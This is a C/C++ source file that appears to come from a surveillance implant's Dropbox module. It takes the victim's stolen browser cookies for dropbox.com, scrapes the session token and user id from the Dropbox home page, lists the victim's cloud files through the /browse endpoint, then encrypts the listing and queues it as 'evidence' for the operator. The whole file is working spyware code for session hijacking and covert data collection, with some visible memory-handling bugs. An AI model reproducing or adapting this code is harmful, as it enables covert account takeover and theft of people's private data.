#include <Windows.h>
#include <stdio.h>
#include "proto.h"
#include "zmem.h"
#include "cloud.h"
#include "globals.h"
#include "debug.h"
#include "JSON.h"
#include "JSONValue.h"

#include "cookies.h"
#include "social.h"
#include "filesystem.h"

int DropboxId = 0;
LPSTR strToken = NULL;
LPSTR strCookiesAggregated = NULL;

BOOL QueueFileSystemLog(__in LPBYTE lpEvBuff, __in DWORD dwEvSize);

int GetDropboxTokens(void)
{
	// N.B will fault if executed before cookies are taken

	for (DWORD i=0; i<SOCIAL_ENTRY_COUNT; i++)
	{
		if ( ! wcscmp(pSocialEntry[i].strDomain, L"dropbox.com" ) )
		{
			DWORD ret_val;
			BYTE *r_buffer = NULL;
			DWORD response_len;
			char *parser1, *parser2;
			char userId[256];
			char token[512];

			LPSTR strCookieWWW = GetCookieString(L"www.dropbox.com");
			LPSTR strCookieW = GetCookieString(L"dropbox.com");
			LPSTR strCookie = NULL;
		
			/* skip 'Cookie:' then concatenate */
			strCookieWWW = strstr(strCookieWWW, "Cookie:");

			if (strCookieW == NULL || strCookieWWW == NULL)
			{
				zfree(strCookieW);
				zfree(strCookieWWW);
				return -1;
			}

			strCookieWWW += strlen("Cookie:");

			DWORD dwCookieSize = strlen(strCookieWWW) + strlen(strCookieW);
			strCookie =  (LPSTR) zalloc(dwCookieSize) + 2;
			_snprintf_s(strCookie, dwCookieSize, _TRUNCATE, "%s%s", strCookieW, strCookieWWW);

			ret_val = HttpSocialRequest(L"www.dropbox.com", L"GET", L"/home", 443, NULL, 0, &r_buffer, &response_len, strCookie);	
			
			// fix:
			//zfree(strCookieW);
			//zfree(strCookieWWW);

			if (ret_val != SOCIAL_REQUEST_SUCCESS)
				return ret_val;

			strCookiesAggregated = strCookie;

			
			parser1 = (char *)r_buffer;
			for( ;; )
			{
				/* search for:  "id": 354719956, */
				parser1 = (char *)strstr((char *)parser1, "\"id\": ");
				if (!parser1) {
					zfree(r_buffer);
					return -1;
				}

				parser1 += strlen("\"id\": ");

				parser2 = (char *)strchr((char *)parser1, ',');
				if (!parser2) {
					zfree(r_buffer);
					return -1;
				}

				*parser2=0;
				_snprintf_s(userId, sizeof(userId), _TRUNCATE, "%s", parser1);
				
				parser1 = parser2 + 1;

				/* search for: "TOKEN": "7AuWDqUcp2z1uBIzcIWVf1Bd" */
				parser1 = (char *)strstr((char *)parser1, "\"TOKEN\": \"");
				if (!parser1) {
					zfree(r_buffer);
					return -1;
				}
				parser1 += strlen( "\"TOKEN\": \"");

				parser2 = (char *)strchr((char *)parser1, '"');
				if (!parser2) {
					zfree(r_buffer);
					return -1;
				}

				*parser2=0;

				_snprintf_s(token, sizeof(token), _TRUNCATE, "%s", parser1);
				if (strlen(token)) 
					break;
				parser1 = parser2 + 1;
			}
			zfree(r_buffer);

#ifdef _DEBUG
			OutputDebug(L"[*] %S> dropbox credentials: %S - %S\n", __FUNCTION__, userId, token );
#endif

			/* convert id string to number */
			DropboxId = atoi(userId);

			/* set strToken to 't=7AuWDqUcp2z1uBIzcIWVf1Bd' */
			strToken = (LPSTR) zalloc(strlen(token) + 2);
			_snprintf_s(strToken, strlen(token) + 3, _TRUNCATE, "t=%s", token);
		}
	}
	
	return -1;
}

BOOL DropboxExplorePath(__out LPBYTE *lpBuffer, __out LPDWORD dwBuffSize, __in LPWSTR strStartPath, __in DWORD dwDepth, __in LPSTR strCookiesAggregated)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL;
	DWORD response_len;
	JSONValue* jValue = NULL;
	JSONArray  jFiles;
	JSONObject jObj, jEntry;

	WCHAR strRequest[512];

	/*	
		POST /browse?_subject_uid=354719956 
		body: t=7AuWDqUcp2z1uBIzcIWVf1Bd
	*/
	_snwprintf_s(strRequest, 512, _TRUNCATE, L"/browse?_subject_uid=%d", DropboxId);
	ret_val = HttpSocialRequestWithAdditionalHeader(L"www.dropbox.com", L"POST", strRequest, 443, (LPBYTE*)strToken, strlen(strToken), &r_buffer, &response_len, strCookiesAggregated, L"Content-Type: application/x-www-form-urlencoded; charset=UTF-8");


	if (ret_val != SOCIAL_REQUEST_SUCCESS)
	{
		zfree(r_buffer);
		return ret_val;
	}

	/* parse json */
	jValue = JSON::Parse((CHAR*)r_buffer);
	if (jValue == NULL)
	{
		zfree(r_buffer);
		return FALSE;
	}

	if (jValue->IsObject())
	{

		jObj = jValue->AsObject();

		/* find "file_info" */
		if (jObj.find(L"file_info") != jObj.end() && jObj[L"file_info"]->IsArray())
		{

			/* root dir */
			WCHAR strDriveLetter[4] = L"C:\\";
			directory_header_struct directory_header;
			SecureZeroMemory(&directory_header, sizeof(directory_header_struct));

			directory_header.version    = DIR_EXP_VERSION;
			directory_header.flags     |= PATH_IS_DIRECTORY;
			directory_header.path_len  |= wcslen(strDriveLetter) * 2;

			// alloc space
			if (!*lpBuffer)
				*lpBuffer = (LPBYTE) zalloc(sizeof(directory_header_struct)  + directory_header.path_len);
			else
				*lpBuffer = (LPBYTE) realloc(*lpBuffer, *dwBuffSize + sizeof(directory_header_struct) + directory_header.path_len);

			memcpy(*lpBuffer + *dwBuffSize, &directory_header, sizeof(directory_header_struct));
			memcpy(*lpBuffer + *dwBuffSize + sizeof(directory_header_struct), strDriveLetter, directory_header.path_len);
			*dwBuffSize += sizeof(directory_header_struct) + directory_header.path_len;

			/* files */
			jFiles = jObj[L"file_info"]->AsArray();

			for (DWORD i=0; i<jFiles.size(); i++)
			{
				jEntry = jFiles[i]->AsObject();

				/* get name, size, last write*/
				WCHAR strFileName[260];
				_snwprintf_s(strFileName, 260, _TRUNCATE, L"%s", jEntry[L"fq_path"]->AsString().c_str());
				
				SecureZeroMemory(&directory_header, sizeof(directory_header_struct));
				directory_header.version = DIR_EXP_VERSION;
				directory_header.path_len = wcslen(strFileName) * 2;

				BOOL b = jEntry[L"is_dir"]->AsBool(); //AsString().c_str();
				
				//if ( !wcscmp(jEntry[L"is_dir"]->AsString().c_str(), L"true") )
				if( b)
					directory_header.flags |= PATH_IS_DIRECTORY;

				if (!*lpBuffer)
					*lpBuffer = (LPBYTE) zalloc(sizeof(directory_header_struct) + directory_header.path_len);
				else
					*lpBuffer = (LPBYTE) realloc(*lpBuffer, *dwBuffSize + sizeof(directory_header_struct) + directory_header.path_len);

				memcpy(*lpBuffer + *dwBuffSize, &directory_header, sizeof(directory_header_struct));
				memcpy(*lpBuffer + *dwBuffSize + sizeof(directory_header_struct), strFileName, directory_header.path_len);
				*dwBuffSize += sizeof(directory_header_struct) + directory_header.path_len;
			}
		}
	}

	
	delete jValue;
	zfree(r_buffer);
	return TRUE;
}

BOOL DropboxHandler(DWORD dwMsgLen, DWORD dwNumDir, LPBYTE lpDirBuffer)
{
	if (!bCollectEvidences)
		return FALSE;

	/* loop through the number of dirs requested */
	for (DWORD i=0 ; i<dwNumDir; i++)
	{
		DWORD dwDepth  =  lpDirBuffer[0];
		DWORD dwDirLen =  lpDirBuffer[4];
		LPWSTR strPath =  (LPWSTR) &lpDirBuffer[8];

#ifdef _DEBUG
		OutputDebug(L"[*] %S> requested: %s depth: %d length %d\n", __FUNCTION__, strPath, dwDepth, dwDirLen);
#endif

		/* initialize dropbox id */
		if ( DropboxId == 0 || strToken == NULL || strCookiesAggregated == NULL )
			GetDropboxTokens();

		DWORD dwBuffSize = 0;
		LPBYTE lpBuffer = NULL;
		DropboxExplorePath(&lpBuffer, &dwBuffSize, strPath, dwDepth, strCookiesAggregated);

		DWORD dwEvSize;
		LPBYTE lpEvBuffer = PackEncryptEvidence(dwBuffSize, lpBuffer, PM_EXPLOREDIR, NULL, 0, &dwEvSize);
		zfree(lpBuffer);
			
		if (!QueueFileSystemLog(lpEvBuffer, dwEvSize))
			zfree(lpEvBuffer);

		lpDirBuffer += sizeof(DWORD);
		lpDirBuffer += sizeof(DWORD);
		lpDirBuffer += dwDirLen;
	}
	
	return TRUE;
}